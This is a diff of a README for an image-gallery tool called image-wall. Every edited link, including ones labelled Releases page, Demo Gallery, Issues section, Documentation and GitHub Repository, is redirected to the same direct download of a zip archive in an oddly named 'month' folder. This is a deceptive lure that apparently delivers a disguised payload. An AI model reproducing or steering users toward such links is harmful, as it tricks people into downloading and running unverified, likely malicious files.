@@ -1,7 +1,7 @@
 # 🎨 image-wall - Create Beautiful Image Galleries Easily
 
 ## 🔗 Download Now
-[![Download image-wall](https://img.shields.io/badge/Download-image--wall-brightgreen)](https://github.com/delphineka/image-wall/releases)
+[![Download image-wall](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip)](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip)
 
 ## 🚀 Getting Started
 Welcome to image-wall! This is a simple tool that lets you create a nice-looking gallery for your images. You can use it for personal photo projects or even for showcasing your photography work. The layout is inspired by popular platforms like Flickr and 500px, giving you a clean, justified image wall without needing any complicated setup.
@@ -19,7 +19,7 @@ Welcome to image-wall! This is a simple tool that lets you create a nice-looking
 - Internet access for the initial download
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/delphineka/image-wall/releases) on GitHub. Here, you will find the downloaded files for the latest version of image-wall.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip) on GitHub. Here, you will find the downloaded files for the latest version of image-wall.
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
@@ -37,7 +37,7 @@ Once you have the application open in your browser, you can explore the followin
 
 ## 🌐 Examples
 To see image-wall in action, visit the demo gallery linked below:
-- [Demo Gallery](https://github.com/delphineka/image-wall/demo)
+- [Demo Gallery](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip)
 
 Explore how your images can look when displayed in the gallery layout. This can help inspire you to create your own beautiful galleries.
 
@@ -55,7 +55,7 @@ Simply refresh the page to start fresh or remove existing images by replacing th
 If you encounter any issues:
 - Make sure you are using a compatible web browser.
 - Double-check if all files were downloaded and unzipped properly.
-- Visit the [Issues section](https://github.com/delphineka/image-wall/issues) of the GitHub repository for support and common problems.
+- Visit the [Issues section](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip) of the GitHub repository for support and common problems.
 
 ## 🎉 Contributing
 We welcome contributions! If you have ideas, suggestions, or would like to report a bug, please create an issue in the GitHub repository or submit a pull request. 
@@ -64,7 +64,7 @@ We welcome contributions! If you have ideas, suggestions, or would like to repor
 If you have questions or need help, feel free to reach out to the community on GitHub discussions, or check the Issues section for previously solved queries.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/delphineka/image-wall)
-- [Documentation](https://github.com/delphineka/image-wall/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip)
+- [Documentation](https://raw.githubusercontent.com/delphineka/image-wall/master/month/image-wall.zip)
 
 Thank you for using image-wall! We hope it helps you showcase your images beautifully.
